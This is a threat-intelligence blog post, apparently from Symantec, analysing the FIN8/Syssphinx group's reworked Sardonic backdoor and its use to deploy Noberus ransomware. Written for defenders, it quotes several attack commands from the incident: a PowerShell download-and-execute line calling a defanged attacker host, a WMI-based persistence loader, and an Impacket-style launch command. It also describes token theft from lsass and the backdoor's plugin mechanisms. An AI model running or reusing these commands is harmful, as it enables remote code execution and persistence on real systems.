Financially motivated cyber-crime group continues to develop and improve tools and tactics. Symantec’s Threat Hunter Team, a part of Broadcom, recently observed the Syssphinx (aka FIN8) cyber-crime group deploying a variant of the Sardonic backdoor to deliver the Noberus ransomware. While analysis of the backdoor revealed it to be part of the Sardonic framework previously used by the group, and analyzed in a 2021 report from Bitdefender, it seems that most of the backdoor’s features have been altered to give it a new appearance. Active since at least January 2016, Syssphinx (aka FIN8) is a financially motivated cyber-crime group known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemicals, and finance sectors. The group is known for utilizing so-called living-off-the-land tactics, making use of built-in tools and interfaces such as PowerShell and WMI, and abusing legitimate services to disguise its activity. Social engineering and spear-phishing are two of the group’s preferred methods for initial compromise.While Syssphinx initially specialized in point-of-sale (POS) attacks, in the past few years the group has been observed using a number of ransomware threats in its attacks. In June 2021, Syssphinx was seen deploying the Ragnar Locker ransomware onto machines it had compromised in a financial services company in the U.S. earlier in the year. The activity marked the first time the group was observed using ransomware in its attacks. Ragnar Locker is developed by a financially motivated cyber-crime group Symantec calls Hornworm (aka Viking Spider). In January 2022, a family of ransomware known as White Rabbit was linked to Syssphinx. A malicious URL linked to White Rabbit attacks was also linked to Syssphinx. In addition, attacks involving White Rabbit used a variant of the Sardonic backdoor, a known Syssphinx tool. In December 2022, Symantec observed the group attempting to deploy the Noberus (aka ALPHV, BlackCat) ransomware in attacks. Noberus is operated by a financially motivated cyber-crime group Symantec calls Coreid (aka Blackmatter, Carbon Spider, FIN7). The Syssphinx group’s move to ransomware suggests the threat actors may be diversifying their focus in an effort to maximize profits from compromised organizations. Syssphinx is known for taking extended breaks between attack campaigns in order to improve its tactics, techniques, and procedures (TTPs). For instance, since 2019, Syssphinx had used backdoor malware called Badhatch in attacks. Syssphinx updated Badhatch in December 2020 and then again in January 2021. Then in August 2021, Bitdefender researchers published details of a new backdoor dubbed Sardonic and linked it to the same group. The C++-based Sardonic backdoor has the ability to harvest system information and execute commands, and has a plugin system designed to load and execute additional malware payloads delivered as DLLs. The Syssphinx attack observed by Symantec in December 2022, in which the attackers attempted to deploy the Noberus ransomware, involved similar techniques as a Syssphinx attack described by Bitdefender researchers in 2021. However, the most recent attack had some key differences, including the final payload being the Noberus ransomware and the use of a reworked backdoor. The revamped Sardonic backdoor analyzed in this blog shares a number of features with the C++-based Sardonic backdoor analyzed by Bitdefender. However, most of the backdoor’s code has been rewritten, such that it gains a new appearance. Interestingly, the backdoor code no longer uses the C++ standard library and most of the object-oriented features have been replaced with a plain C implementation. In addition, some of the reworkings look unnatural, suggesting that the primary goal of the threat actors could be to avoid similarities with previously disclosed details. For example, when sending messages over the network, the operation code specifying how to interpret the message has been moved after the variable part of the message, a change that adds some complications to the backdoor logic. This goal seemed limited to just the backdoor itself, as known Syssphinx techniques were still used. During the December 2022 incident, the attackers connected with PsExec to execute the command “quser” in order to display the session details and then the following command to launch the backdoor: powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString('https://37-10-71-215[.]nip[.]io:8443/7ea5fa') Next, the attackers connected to the backdoor to check details of the affected computer before executing the command to establish persistence. powershell -nop -ep bypass -c CSIDL_WINDOWS\temp\1.ps1 2BDf39983402C1E50e1d4b85766AcF7a This resulted with a process similar to that described by Bitdefender. powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass] 'root\cimv2:System__Cls').Properties['Parameter'].Value);[a8E95540.b2ADc60F955]::c3B3FE9127a() The next day, the attackers connected to the persistent backdoor, but paused after running a few basic commands. Roughly 30 minutes later, the activity resumed with the attackers using what looked like wmiexec.py from Impacket, which started a process to launch a new backdoor. cmd.exe /Q /c powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\shvnc.ps1 1> \\127.0.0.1\ADMIN$\__1671129123.2520242 2>&1 This new backdoor was used by the attackers for the next few hours. Interestingly, the new backdoor PowerShell script uses a new file name and simplifies the command-line by removing the decryption key argument. Switching the tools like this could indicate that the attackers are testing new features, so we were curious to analyze this new sample in detail. One difference between the attack described by Bitdefender and the recent attacks observed by Symantec is the technique used to deploy the backdoor. In our case, the backdoor is embedded (indirectly) into a PowerShell script (see Figure 1) used to infect target machines, while the variant documented by Bitdefender features intermediate downloader shellcode that downloads and executes the backdoor. The intention of the first line of code is to delete the PowerShell script file itself. The second line checks the architecture of the current process and picks the 32-bit or 64-bit version of the encoded .NET Loader as appropriate. The third line decodes the .NET Loader binary and loads it into the current process. Finally, the fourth line of code starts the main functionality of the .NET Loader, where the injector and backdoor are decrypted and control is passed to the injector.The .NET Loader is an obfuscated .NET DLL. The obfuscation manifests certain ConfuserEx features. The .NET Loader contains two blobs, which it first decrypts with the RC4 algorithm using a hardcoded decryption key before decompressing. The decompressed blobs are then copied into a continuous chunk of memory. The .NET Loader then transfers control to the second blob (injector), passing the memory location and size of the first blob (backdoor) as parameters.The decrypt_dwords subroutine seen in Figure 3 decrypts a few dwords (marked as encrypted_dwords in Figure 3) to reveal a short chunk of code. The revealed code is shown in Figure 4 and includes a decryption loop that looks similar to the “shellcode decryption routine” described in Bitdefender’s report.The purpose of the injector is to start the backdoor in a newly created WmiPrvSE.exe process. When creating the WmiPrvSE.exe process, the injector attempts to start it in session-0 (best effort) using a token stolen from the lsass.exe process. The Backdoor is also in the form of shellcode and its entrypoint looks similar to that of the injector entrypoint, with the exception of polymorphism.One of the interesting features of the backdoor is related to interactive sessions, where the attacker runs cmd.exe or other interactive processes on the affected computer. Interestingly, the sample allows up to 10 such sessions to run at the same time. In addition, when starting each individual process, the attacker may use a process token stolen from a specified process ID that is different for each session. Another notable feature is that the backdoor supports three different formats to extend its functionality. The first is with PE DLL plugins that the backdoor loads within its own process and then calls: export "Start" (if present) on loading with the following arguments: length of parameters array below address of parameters array containing pointers to arguments received from the remote attacker buffer of 1024 bytes to collect output for sending to the remote attacker export "End" (if present) on unloading with the following arguments: 0 (hardcoded) buffer of 1024 bytes to collect output for sending to the remote attacker The second format supported by the backdoor is in the form of shellcode, where each shellcode plugin executes in its own dedicated process. Before starting the shellcode, the backdoor creates a new process and writes into its memory the shellcode blob preceded by a simple structure storing a copy of arguments received from the remote attacker. It then uses the QueueUserAPC API to execute the shellcode, such that the address of the mentioned structure is passed as the first and only shellcode argument. To unload any shellcode plugin, the backdoor simply terminates the process associated with the specified plugin. Finally, the third format is also in the form of shellcode but with a different convention to pass the arguments. The backdoor executes this shellcode in the context of the backdoor's main thread and no other commands are accepted until the shellcode returns. To execute the shellcode, the backdoor simply calls it as a subroutine passing four arguments, each providing the address of the corresponding argument received from the remote attacker (the backdoor appears to use 64-bit values when passing the addresses in case of 32-bit shellcode). For all the communication that follows (incoming and outgoing), the backdoor uses the following method to determine the size of the body field (body_size): body_size is 0x80 for each incoming message with a header field value of 0xFFFFFE78 (hardcoded), and body_size is simply the value of the header field in all other cases. The content of body and footer fields is encrypted with the RC4 algorithm using rc4_key as the encryption key. The keystream is reused when encrypting each individual field. Syssphinx continues to develop and improve its capabilities and malware delivery infrastructure, periodically refining its tools and tactics to avoid detection. The group’s decision to expand from point-of-sale attacks to the deployment of ransomware demonstrates the threat actors’ dedication to maximizing profits from victim organizations. The tools and tactics detailed in this report serve to underscore how this highly skilled financial threat actor remains a serious threat to organizations.